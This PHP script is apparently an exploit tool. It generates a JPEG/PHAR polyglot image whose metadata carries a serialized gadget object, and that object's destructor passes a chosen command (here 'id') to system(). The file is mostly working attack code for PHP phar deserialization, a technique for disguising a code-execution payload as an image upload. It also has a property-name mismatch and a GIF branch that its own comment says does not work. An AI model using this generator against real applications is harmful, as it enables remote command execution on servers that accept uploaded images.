<?php

class PolyglotPharGenerator {

    const FILE_TYPE_JPG = 'jpg';

    const FILE_TYPE_GIF = 'gif';

    const TMP_FILENAME = 'temp.tar.phar';

    private string $fileType;

    private string $inputFilename;

    private string $outputFilename;

    private $payloadObject;

    public function __construct(
        string $fileType = self::FILE_TYPE_JPG,
        string $inputFilename = 'in.jpg',
        string $outputFilename = 'out.jpg',
        $payloadObject = null
    ) {
        $this->filetype = $fileType;
        $this->inputFilename = $inputFilename;
        $this->outputFilename = $outputFilename;
        $this->payloadObject = $payloadObject;
    }

    /** 
     * Generate a Polyglot PHAR + JPG
     */
    private function generatePharJpg(): void {
        $jpeg = \file_get_contents($this->inputFilename);
        $phar = $this->generateBasePhar($this->payloadObject, '');
        
        $poliglotPharJpg = $this->generatePharJpegPolyglot($phar, $jpeg);
        
        \file_put_contents($this->outputFilename, $poliglotPharJpg);
    }

    /**
     * Todo: It doesn't work check why.
     * Generate a Polyglot PHAR + GIF
     */
    private function generatePharGif(): void {
        // GIF Header, size 300 x 300
        $prefix = "\x47\x49\x46\x38\x39\x61" . "\x2c\x01\x2c\x01";
        $phar = $this->generateBasePhar($this->payloadObject, $prefix);

        \file_put_contents($this->outputFilename, $phar);
    }

    private function generateBasePhar($objectPayload, $prefix): string {
        @unlink(self::TMP_FILENAME);

        $phar = new Phar(self::TMP_FILENAME);
        $phar->startBuffering();
        $phar->addFromString("test.txt", "test");
        $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");
        $phar->setMetadata($objectPayload);
        $phar->stopBuffering();
        
        $basecontent = \file_get_contents(self::TMP_FILENAME);

        @unlink(self::TMP_FILENAME);

        return $basecontent;
    }
    
    private function generatePharJpegPolyglot($phar, $jpeg): string {
        $phar = substr($phar, 6); // remove <?php dosent work with prefix
        $len = strlen($phar) + 2; // fixed 
        $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $phar . substr($jpeg, 2);
        $contents = substr($new, 0, 148) . "        " . substr($new, 156);
    
        // calc tar checksum
        $chksum = 0;
        for ($i=0; $i<512; $i++){
            $chksum += ord(substr($contents, $i, 1));
        }
        // embed checksum
        $oct = sprintf("%07o", $chksum);
        $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
        return $contents;
    }

    public function generate(): ?string {
        switch($this->filetype){
            case self::FILE_TYPE_JPG:
                return $this->generatePharJpg();

            case self::FILE_TYPE_GIF:
                return $this->generatePharGif();

            default:
                return null;
        }
    }
}

// POP Gadget Classes
class MyClass {
    public $command;

    public function __destruct(){
        \system($this->command);
    }
};
// Gadget Chain
$object = new MyClass();
$object->command = 'id';

// debug: print serialized object
echo \sprintf(
    "Serialized Object: \n\nraw = %s\nbase64 = %s\n\n",
    \serialize($object),
    \base64_encode(serialize($object))
);

// Generate PHAR + JPG Polyglot File
echo \sprintf("Generating polyglot phar ...\n");

// Generate JPG
$polyglotPharGenerator = new PolyglotPharGenerator(
    PolyglotPharGenerator::FILE_TYPE_JPG,
    'in.jpg',
    'out.jpg',
    $object
);
$polyglotPharGenerator->generate();

echo \sprintf('All Done!\n');